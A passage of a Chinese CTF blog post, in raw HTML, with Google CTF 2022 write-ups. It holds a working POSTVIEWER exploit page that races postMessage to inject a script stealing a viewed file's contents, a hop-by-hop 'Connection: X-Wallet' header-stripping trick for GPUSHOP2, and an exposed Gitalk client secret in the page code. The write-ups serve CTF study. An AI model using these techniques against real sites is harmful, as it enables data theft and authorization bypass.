class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">pre</span> <span class="attr">id</span>=<span class="string">&quot;log&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">const</span> <span class="variable constant_">URL</span> = <span class="string">&#x27;https://postviewer-web.2022.ctfcompetition.com&#x27;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">const</span> <span class="title function_">sleep</span> = (<span class="params">d</span>) =&gt; <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">r</span>) =&gt;</span> <span class="built_in">setTimeout</span>(r, d));</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">function</span> <span class="title function_">notify</span>(<span class="params">...args</span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            navigator.<span class="title function_">sendBeacon</span>(<span class="string">&#x27;&#x27;</span>, args);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="variable language_">console</span>.<span class="title function_">log</span>(...args);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">load</span>(<span class="params">win, url</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">const</span> buffer = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>(<span class="number">1e7</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            win.<span class="property">location</span> = <span class="string">&#x27;about:blank&#x27;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                loop.<span class="property">onmessage</span> = <span class="function">() =&gt;</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                    <span class="keyword">try</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                        win.<span class="property">origin</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                        <span class="title function_">resolve</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                    &#125; <span class="keyword">catch</span> (e) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                        loop.<span class="title function_">postMessage</span>(<span class="literal">null</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                &#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                loop.<span class="title function_">postMessage</span>(<span class="literal">null</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            &#125;);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            win.<span class="property">location</span> = url;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                loop.<span class="property">onmessage</span> = <span class="function">() =&gt;</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                    <span class="keyword">if</span> (win.<span class="property">length</span> === <span class="number">1</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                        <span class="comment">// Send a huge message so e.data.toString() blocks a thread for a while</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                        <span class="comment">// By transfering only a reference to memory chunk, sending the message</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                        <span class="comment">// will be fast enough to race condition window.onmessage and iframe.onload</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                        <span class="comment">// notify(Date.now(), &#x27;==1&#x27;);</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                        win?.<span class="title function_">postMessage</span>(buffer, <span class="string">&#x27;*&#x27;</span>, [buffer.<span class="property">buffer</span>]);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                        <span class="comment">// Once we know the innerIframe loaded, we can now postMessage to it</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                        <span class="comment">// because it will be rendered in a different process in Chrome, so</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                        <span class="comment">// the blocked parent thread won&#x27;t affect rendering the iframe!</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                            win[<span class="number">0</span>]?.<span class="title function_">postMessage</span>(</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                                &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                                    <span class="attr">body</span>: <span class="string">`LOL! &lt;script&gt;onmessage=async (e)=&gt;&#123;</span></span></span></span><br><span class="line"><span class="string"><span class="language-javascript"><span class="language-xml">                      let text = await e.data.body.text();</span></span></span></span><br><span class="line"><span class="string"><span class="language-javascript"><span class="language-xml">                      parent.opener.postMessage(&#123;stolen: text&#125;, &#x27;*&#x27;);</span></span></span></span><br><span class="line"><span class="string"><span class="language-javascript"><span class="language-xml">                    &#125;&lt;\/script&gt;`</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                                    <span class="attr">mimeType</span>: <span class="string">&quot;text/html&quot;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                                &#125;,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                                <span class="string">&quot;*&quot;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                            );</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                            <span class="title function_">resolve</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                        &#125;, <span class="number">500</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                    &#125; <span class="keyword">else</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                        loop.<span class="title function_">postMessage</span>(<span class="literal">null</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                &#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                loop.<span class="title function_">postMessage</span>(<span class="literal">null</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            &#125;);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">return</span> <span class="number">1</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">var</span> <span class="variable constant_">TIMEOUT</span> = <span class="number">1500</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">var</span> win;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">function</span> <span class="title function_">waitForMessage</span>(<span class="params">url</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="keyword">async</span> resolve =&gt; &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                onmessage = <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                    <span class="keyword">if</span> (e.<span class="property">data</span>.<span class="property">stolen</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                        <span class="title function_">notify</span>(e.<span class="property">data</span>.<span class="property">stolen</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                        log.<span class="property">innerText</span> += e.<span class="property">data</span>.<span class="property">stolen</span> + <span class="string">&#x27;\n&#x27;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                        <span class="title function_">resolve</span>(<span class="literal">false</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="keyword">const</span> rnd = <span class="string">&#x27;a&#x27;</span> + <span class="title class_">Math</span>.<span class="title function_">random</span>().<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">slice</span>(<span class="number">2</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="keyword">const</span> _url = url + <span class="string">&#x27;,&#x27;</span> + rnd;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="keyword">await</span> <span class="title function_">load</span>(win, _url);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                    <span class="title function_">resolve</span>(<span class="literal">true</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                &#125;, <span class="variable constant_">TIMEOUT</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            &#125;);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        onload = onclick = <span class="keyword">async</span> () =&gt; &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">if</span> (!win || win.<span class="property">closed</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                win = <span class="title function_">open</span>(<span class="string">&#x27;about:blank&#x27;</span>, <span class="string">&#x27;hack&#x27;</span>, <span class="string">&#x27;width=800,height=300,top=500&#x27;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; <span class="number">100</span>; i++) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="keyword">const</span> url = <span class="string">`<span class="subst">$&#123;URL&#125;</span>/#a,.list-group-item:nth-child(<span class="subst">$&#123;i&#125;</span>)`</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="keyword">while</span> (<span class="keyword">await</span> <span class="title function_">waitForMessage</span>(url));</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<h2 id="GPUSHOP2"><a href="#GPUSHOP2" class="headerlink" title="GPUSHOP2"></a>GPUSHOP2</h2><p>根据去年的同样题目，我们知道了<code>X-WALLET</code>这个header是原罪，只要去除这个header，那么我们就能拿到地址为0的eth地址，这个地址很有钱，所以我们可以去随便购买FLAG。去年这个题目是有非预期的，因为去年的<code>URL编码</code>bypass掉了。今年是所有的请求都会添加这个header。实际预期的解法是：<a target="_blank" rel="noopener" href="https://blog.huli.tw/2022/07/09/google-ctf-2022-writeup/%E3%80%82">https://blog.huli.tw/2022/07/09/google-ctf-2022-writeup/。</a></p>
<p>简单地说：就是HTTP HEADERS 有两种。</p>
<ol>
<li>End-to-end</li>
<li>Hop-by-hop</li>
</ol>
<p>其中HOP-HOP就是专门给<code>proxy</code>看的，换句话说真实的web服务器是看不到的。他在中间的proxy之前通信时就会被删除掉。所以也就给了我们操作的空间，我们如何让<code>proxy</code>把<code>X-wallet</code>给删除掉呢？</p>
<p>常见hop-hop的请求头有</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Connection</span><br><span class="line">Keep-Alive</span><br><span class="line">Proxy-Authenticate</span><br><span class="line">Proxy-Authorization</span><br><span class="line">TE</span><br><span class="line">Trailers</span><br><span class="line">Transfer-Encoding</span><br><span class="line">Upgrade</span><br></pre></td></tr></table></figure>

<p>其中<code>Connection</code>这个请求头很有意思，有趣的点在于，在这个请求头中 可以把其他的不是hop-hop默认请求头的改为默认请求头，所以这个题目也就变成了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Connection: X-Wallet</span><br></pre></td></tr></table></figure>

<p>参考:<a target="_blank" rel="noopener" href="https://nathandavison.com/blog/abusing-http-hop-by-hop-request-headers">https://nathandavison.com/blog/abusing-http-hop-by-hop-request-headers</a></p>
<p><a target="_blank" rel="noopener" href="https://ctftime.org/writeup/17195">https://ctftime.org/writeup/17195</a></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.huli.tw/2022/07/09/google-ctf-2022-writeup/">https://blog.huli.tw/2022/07/09/google-ctf-2022-writeup/</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.maple3142.net/2022/07/04/google-ctf-2022-writeups/#web">https://blog.maple3142.net/2022/07/04/google-ctf-2022-writeups/#web</a></p>
<p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1378/#toc__5">https://tttang.com/archive/1378/#toc__5</a></p>
<p>log4j 1.x 与 logback 的鸡肋RCE讨论: <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/NzDli0ul4PoAoABdyQq7Hg">https://mp.weixin.qq.com/s/NzDli0ul4PoAoABdyQq7Hg</a></p>
<p>Vmware: <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/J5H9aZVhwQaVn3LvKi2Kqw">https://mp.weixin.qq.com/s/J5H9aZVhwQaVn3LvKi2Kqw</a></p>
<p>log4j 漏洞一些特殊的利用方式: <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg4OTExMjE2Mw==&amp;mid=2247483945&amp;idx=1&amp;sn=b15b68d95da83bb20f1b3496396f823a&amp;chksm=cff19125f88618338373a32f98be3d2a9497b464d6531658c2aa96f4872c23eed294441917b5&amp;mpshare=1&amp;scene=23&amp;srcid=1211aS0Tghr1agBnBRlwwGTw&amp;sharer_sharetime=1639232420884&amp;sharer_shareid=33a823b10ae99f33a60db621d83241cb#rd">https://mp.weixin.qq.com/s?__biz=Mzg4OTExMjE2Mw==&amp;mid=2247483945&amp;idx=1&amp;sn=b15b68d95da83bb20f1b3496396f823a&amp;chksm=cff19125f88618338373a32f98be3d2a9497b464d6531658c2aa96f4872c23eed294441917b5&amp;mpshare=1&amp;scene=23&amp;srcid=1211aS0Tghr1agBnBRlwwGTw&amp;sharer_sharetime=1639232420884&amp;sharer_shareid=33a823b10ae99f33a60db621d83241cb#rd</a></p>
<p>浅谈Log4j2信息泄露与不出网回显: <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10659#toc-5">https://xz.aliyun.com/t/10659#toc-5</a></p>
<p>Apache Log4j2拒绝服务漏洞分析: <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10670">https://xz.aliyun.com/t/10670</a></p>
<p>闲谈: <a target="_blank" rel="noopener" href="https://github.com/Firebasky/Java/blob/main/java%E6%97%A5%E5%B8%B8/%E9%97%B2%E8%B0%88log4j2.md">https://github.com/Firebasky/Java/blob/main/java%E6%97%A5%E5%B8%B8/%E9%97%B2%E8%B0%88log4j2.md</a></p>
<p><a target="_blank" rel="noopener" href="https://zenn.dev/kyasbal/articles/f2295d1875d26a#postviewer">https://zenn.dev/kyasbal/articles/f2295d1875d26a#postviewer</a></p>
</blockquote>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://dem0dem0.top">Dem0</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://dem0dem0.top/2022/07/20/GoogleCTF2022%E5%A4%8D%E7%8E%B0/">https://dem0dem0.top/2022/07/20/GoogleCTF2022复现/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://dem0dem0.top" target="_blank">Dem0のblog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF%E5%A4%8D%E7%8E%B0/">CTF复现</a></div><div class="post_share"><div class="social-share" data-image="/img/conver3.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/gh/overtrue/share.js@master/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2022/07/18/JAVA%E5%86%85%E5%AD%98%E9%A9%AC%E6%94%BB%E5%87%BB%E7%AF%87/"><img class="next-cover" src="/img/cover4.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">JAVA内存马攻击篇</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/06/22/%E6%9F%90ciscn%E5%88%86%E5%8C%BA%E4%B8%A4%E4%B8%AA%E9%A2%98%E8%A7%A3/" title="某ciscn分区两个题解"><img class="cover" src="/img/conver3.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-06-22</div><div class="title">某ciscn分区两个题解</div></div></a></div><div><a href="/2022/05/30/mrctf2022java%E9%A2%98%E8%A7%A3/" title="MRCTF-java部分"><img class="cover" src="/img/cover5.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-05-30</div><div class="title">MRCTF-java部分</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="gitalk-container"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://q1.qlogo.cn/g?b=qq&amp;nk=79475432&amp;s=640" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Dem0</div><div class="author-info__description">一个什么都想学的web🐕</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/3em0"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="/atom.xml" target="_blank" title="RSS链接"><i class="fa fa-rss"></i></a><a class="social-icon" href="https://github.com/3em0" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="tencent://AddContact/?fromId=45&amp;fromSubId=1&amp;subcmd=all&amp;uin=79475432&amp;website=www.oicqzone.com" target="_blank" title="Github"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Misfortune meets love; Maintain love for network security;</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Log4J"><span class="toc-number">1.</span> <span class="toc-text">Log4J</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">1.1.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95"><span class="toc-number">1.2.</span> <span class="toc-text">解法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F"><span class="toc-number">1.2.1.</span> <span class="toc-text">非预期</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%84%E6%9C%9F"><span class="toc-number">1.2.2.</span> <span class="toc-text">预期</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Log4j%E6%A0%B8%E5%BC%B9%E7%BA%A7%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95"><span class="toc-number">1.3.</span> <span class="toc-text">Log4j核弹级漏洞调试</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.3.1.</span> <span class="toc-text">简单复现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E5%88%86%E6%9E%90"><span class="toc-number">1.3.2.</span> <span class="toc-text">关键分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JNDI%E6%9F%A5%E8%AF%A2"><span class="toc-number">1.3.3.</span> <span class="toc-text">JNDI查询</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#rc1%E4%BB%A5%E5%8F%8Abypass"><span class="toc-number">1.3.4.</span> <span class="toc-text">rc1以及bypass</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#rc2"><span class="toc-number">1.3.5.</span> <span class="toc-text">rc2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%93%E5%B1%95"><span class="toc-number">1.3.6.</span> <span class="toc-text">拓展</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HORKOS"><span class="toc-number">2.</span> <span class="toc-text">HORKOS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POSTVIEWER"><span class="toc-number">3.</span> <span class="toc-text">POSTVIEWER</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-1"><span class="toc-number">3.1.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-number">3.2.</span> <span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GPUSHOP2"><span class="toc-number">4.</span> <span class="toc-text">GPUSHOP2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">5.</span> <span class="toc-text">参考资料</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/07/20/GoogleCTF2022%E5%A4%8D%E7%8E%B0/" title="GoogleCTF2022复现"><img src="/img/conver3.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="GoogleCTF2022复现"/></a><div class="content"><a class="title" href="/2022/07/20/GoogleCTF2022%E5%A4%8D%E7%8E%B0/" title="GoogleCTF2022复现">GoogleCTF2022复现</a><time datetime="2022-07-20T11:38:09.000Z" title="发表于 2022-07-20 19:38:09">2022-07-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/07/18/JAVA%E5%86%85%E5%AD%98%E9%A9%AC%E6%94%BB%E5%87%BB%E7%AF%87/" title="JAVA内存马攻击篇"><img src="/img/cover4.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="JAVA内存马攻击篇"/></a><div class="content"><a class="title" href="/2022/07/18/JAVA%E5%86%85%E5%AD%98%E9%A9%AC%E6%94%BB%E5%87%BB%E7%AF%87/" title="JAVA内存马攻击篇">JAVA内存马攻击篇</a><time datetime="2022-07-17T16:10:18.000Z" title="发表于 2022-07-18 00:10:18">2022-07-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/07/08/XXE%E5%A4%87%E5%BF%98%E5%BD%95/" title="XXE备忘录"><img src="/img/cover5.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="XXE备忘录"/></a><div class="content"><a class="title" href="/2022/07/08/XXE%E5%A4%87%E5%BF%98%E5%BD%95/" title="XXE备忘录">XXE备忘录</a><time datetime="2022-07-08T02:54:17.000Z" title="发表于 2022-07-08 10:54:17">2022-07-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/06/22/%E6%9F%90ciscn%E5%88%86%E5%8C%BA%E4%B8%A4%E4%B8%AA%E9%A2%98%E8%A7%A3/" title="某ciscn分区两个题解"><img src="/img/conver3.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="某ciscn分区两个题解"/></a><div class="content"><a class="title" href="/2022/06/22/%E6%9F%90ciscn%E5%88%86%E5%8C%BA%E4%B8%A4%E4%B8%AA%E9%A2%98%E8%A7%A3/" title="某ciscn分区两个题解">某ciscn分区两个题解</a><time datetime="2022-06-21T23:53:58.000Z" title="发表于 2022-06-22 07:53:58">2022-06-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/06/18/MapReduce%E4%B8%89%E4%B8%AA%E5%85%A5%E9%97%A8%E6%A1%88%E4%BE%8B/" title="MapReduce三个入门案例"><img src="https://img.dem0dem0.top/images/image-20220618093502409.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="MapReduce三个入门案例"/></a><div class="content"><a class="title" href="/2022/06/18/MapReduce%E4%B8%89%E4%B8%AA%E5%85%A5%E9%97%A8%E6%A1%88%E4%BE%8B/" title="MapReduce三个入门案例">MapReduce三个入门案例</a><time datetime="2022-06-17T16:29:51.000Z" title="发表于 2022-06-18 00:29:51">2022-06-18</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 By Dem0</div><div class="footer_custom_text">努力不一定能实现梦想，但是曾经努力过的事实却足以安慰自己</br><p><a style="margin-inline:5px"target="_blank" href="https://hexo.io/"><img src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&logo=hexo" title="博客框架为 Hexo" alt="HEXO"></a><a style="margin-inline:5px"target="_blank" href="https://butterfly.js.org/"><img src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&logo=bitdefender" title="主题采用 Butterfly" alt="Butterfly"></a><a style="margin-inline:5px"target="_blank" href="https://cloud.tencent.com/"><img src="https://img.shields.io/badge/cdn-Tencent-orange" title="本站使用 Tencent 为静态资源提供CDN加速" alt="Tencent"></a><a style="margin-inline:5px"target="_blank" href="https://github.com/3em0"><img src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&logo=GitHub" title="本站项目由 GitHub 托管" alt="GitHub"></a><a style="margin-inline:5px"target="_blank"href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&logo=Claris" alt="img" title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"></a></p></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><div class="js-pjax"><script>function addGitalkSource () {
  const ele = document.createElement('link')
  ele.rel = 'stylesheet'
  ele.href= 'https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css'
  document.getElementsByTagName('head')[0].appendChild(ele)
}

function loadGitalk () {
  function initGitalk () {
    var gitalk = new Gitalk(Object.assign({
      clientID: 'c752b82ba7eb272e07ff',
      clientSecret: '2032517bf35f44c10890d7bd2d1daf1dc35ce43e',
      repo: '3em0.github.io',
      owner: '3em0',
      admin: ['3em0'],
      id: 'f9f92a33de226c26b530e211dd7c4c51',
      updateCountCallback: commentCount
    },null))

    gitalk.render('gitalk-container')
  }

  if (typeof Gitalk === 'function') initGitalk()
  else {
    addGitalkSource()
    getScript('https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js').then(initGitalk)
  }
}

function commentCount(n){
  let isCommentCount = document.querySelector('#post-meta .gitalk-comment-count')
  if (isCommentCount) {
    isCommentCount.innerHTML= n
  }
}

if ('Gitalk' === 'Gitalk' || !true) {
